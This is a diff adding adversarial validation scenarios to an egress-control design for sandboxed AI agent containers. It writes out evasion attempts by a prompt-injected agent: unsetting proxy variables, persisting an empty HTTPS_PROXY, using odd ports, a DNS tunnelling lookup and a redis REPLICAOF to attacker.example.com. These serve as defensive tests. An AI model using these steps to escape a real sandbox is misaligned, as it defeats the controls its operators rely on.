@@ -277,3 +277,129 @@ If it were implemented in this feature, S1 would fail — which is the guard wor
 | Rootlessness unchanged | S10 |
 | Pre-feature environments unchanged | S11 |
 | FR-010 deferred deliberately, not forgotten | Tier 3 |
+
+---
+
+# Phase B validation (US4/US5)
+
+**These cannot be unit-tested.** US4's claim is about what a *hostile process* cannot do, so every
+scenario below drives the container adversarially rather than cooperatively. A cooperative test
+would pass against Phase A's mechanism too, and prove nothing new.
+
+## S12 — The agent unsets everything and still cannot get out (SC-008)
+
+```bash
+agent-container attach dev
+# inside, as the agent would after a prompt injection:
+unset HTTPS_PROXY HTTP_PROXY https_proxy http_proxy NO_PROXY no_proxy
+curl -s -o /dev/null --max-time 15 https://api.openai.com/v1/models; echo "exit=$?"
+```
+
+**Expected**: **non-zero**. Under Phase A this returns **0** — that difference *is* the feature.
+
+```bash
+echo 'export HTTPS_PROXY=' >> ~/.agent-env/env    # survives teardown, sourced by every shell
+bash -lc 'curl -s -o /dev/null --max-time 15 https://api.openai.com/v1/models'; echo "exit=$?"
+```
+
+**Expected**: **still non-zero.** This is the hole FR-008a had to *disclose* under Phase A and
+Phase B actually closes.
+
+## S13 — A non-standard port is not a way around it (SC-009)
+
+```bash
+curl -s -o /dev/null --max-time 15 http://example.com:8080/; echo "8080=$?"
+curl -s -o /dev/null --max-time 15 http://example.com:1337/; echo "1337=$?"
+ssh -o ConnectTimeout=10 git@github.com; echo "ssh=$?"
+```
+
+**Expected**: all fail. **This is the scenario the first design sketch got wrong** — redirecting
+only 80/443 with a default-accept policy lets `8080` sail straight through, which is *worse than no
+control* because the declaration reads as constraining while the agent reaches anything it likes on
+an unusual port.
+
+## S14 — A declared non-HTTP destination works, and only it (SC-010)
+
+```yaml
+egress:
+  allow:
+    - provider: anthropic
+    - host: github.com
+      port: 22
+```
+
+**Expected**: `ssh -T git@github.com` succeeds; `ssh git@gitlab.com` fails; `github.com` on any
+*other* port fails. That host and that port — not the protocol generally.
+
+## S15 — DNS cannot be used to tunnel out (SC-012, SC-013)
+
+```bash
+getent hosts api.anthropic.com          # declared  -> resolves
+getent hosts api.openai.com             # undeclared -> does not
+getent hosts ZXhmaWx0cmF0ZWQ.attacker.example.com   # tunnelling-shaped -> does not
+dig @8.8.8.8 attacker.example.com       # forced to the sidecar resolver, not Google
+```
+
+**Expected**: only the declared name resolves, and the direct-to-Google query is redirected. A
+forwarding-but-faithful resolver would pass the first three and fail the point — **the exfiltration
+is in the question, not the answer.**
+
+## S16 — The agent gained no privilege (SC-011)
+
+```bash
+<runtime> inspect agent-container-dev --format '{{.HostConfig.CapAdd}}'
+<runtime> inspect agent-egress-dev   --format '{{.HostConfig.CapAdd}}'
+```
+
+**Expected**: `[]` for the agent, `[NET_ADMIN]` for the proxy. **If the agent shows any capability,
+stop** — the feature has inverted its own principle, granting privilege to the container running
+untrusted code.
+
+## S17 — A sidecar cannot launder egress (SC-014)
+
+```yaml
+# dev.services.yaml
+services:
+  redis:
+    image: redis:7
+```
+
+```bash
+redis-cli -h redis REPLICAOF attacker.example.com 6379
+```
+
+**Expected**: refused. The agent needn't escape the namespace — it need only ask something that
+already has the access. A design that locks the agent down and leaves sidecars outside produces an
+environment reporting `enforced: true` while two lines of redis walk out.
+
+## S18 — `git push` still works, or the feature is unshippable
+
+```bash
+git push        # over SSH, with port 22 declared per S14
+```
+
+**Expected**: succeeds. **Default-deny kills `git push` unless SSH is declared**, which is Hard
+Constraint #1 breaking from the opposite direction to Phase A's HTTPS case. If this fails, the
+deploy-time check (FR-003c's SSH arm) did not fire and should have.
+
+## S19 — An undeclared environment is untouched (FR-004)
+
+```bash
+agent-container up legacy      # no egress: key at all
+```
+
+**Expected**: no netfilter rules, no forced DNS, unrestricted. **Default-deny applies only to
+environments that opted in, never retroactively** — an upgrade must not air-gap anyone.
+
+## Definition of done — Phase B
+
+| Check | Source |
+|---|---|
+| Agent capability set unchanged | S16 — **the blocking one** |
+| Evasion fails: unset vars, shell env | S12 |
+| Non-standard ports fail | S13 |
+| Declared non-HTTP works, narrowly | S14 |
+| DNS tunnelling closed | S15 |
+| Sidecar laundering closed | S17 |
+| `git push` survives | S18 |
+| Undeclared environments untouched | S19 |
